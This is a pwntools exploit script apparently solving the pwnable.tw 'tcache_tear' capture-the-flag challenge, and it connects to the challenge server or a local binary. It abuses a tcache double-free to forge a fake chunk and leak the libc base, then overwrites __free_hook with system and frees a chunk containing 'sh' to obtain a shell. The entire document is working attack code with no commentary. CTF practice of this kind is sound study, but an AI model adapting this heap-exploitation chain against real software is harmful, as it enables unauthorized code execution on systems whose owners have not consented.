from pwn import *

e = ELF("./tcache_tear")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10207)
else:
  p = process(e.path)

def alloc(size=0x18, payload="AAAA"):
  p.sendlineafter(":", "1")
  p.sendlineafter(":", str(size))
  p.sendafter(":", payload + ("" if len(payload) == size else "\n"))
    
def free():
  p.sendlineafter(":", "2")

p.sendlineafter("Name:", "A" * 8 + p64(0x91) + p64(0x602060 + 0x10))


alloc()

free()
free()
alloc(payload=p64(0x602060 + 0x10))
alloc()
alloc(payload=p64(0x602060 + 0x10))
free()
free()
alloc(size=0x80, payload=p64(0x602060 + 0x10))
alloc(size=0x80, payload=p64(0x602060 + 0x10))
alloc(size=0x80, payload=p64(0x602060 + 0x10))
alloc(size=0xf8, payload="NEW")
free()
free()
alloc(size=0xf8, payload=p64(0x602060 + 0x10))
alloc(size=0xf8)
alloc(size=0xf8, payload="A" * 0x18 + p64(0x602060 + 0x10) + "A" * 0x60 + p64(0x80) +  p64(0x21) + "A" * 0x18 + p64(0x21))
free()

p.sendlineafter(":", "3")
p.recvuntil("Name :")
libc_base = u64(p.recvline()[0x10:0x18]) - 0x7f4cbc444ca0 + 0x00007f4cbc059000
print("Libc Base: {:#x}".format(libc_base))

alloc(size=0x80, payload=p64(0x602060 + 0x10))
alloc(size=0x8, payload=p64(libc_base + libc.symbols["__free_hook"]))
alloc(size=0x8)
print("Malloc Hook: {:#x}".format(libc_base + libc.symbols["__free_hook"]))
alloc(size=0x8, payload=p64(libc_base + libc.symbols["system"]))
alloc(size=0xf8, payload="sh")
free()

p.interactive()
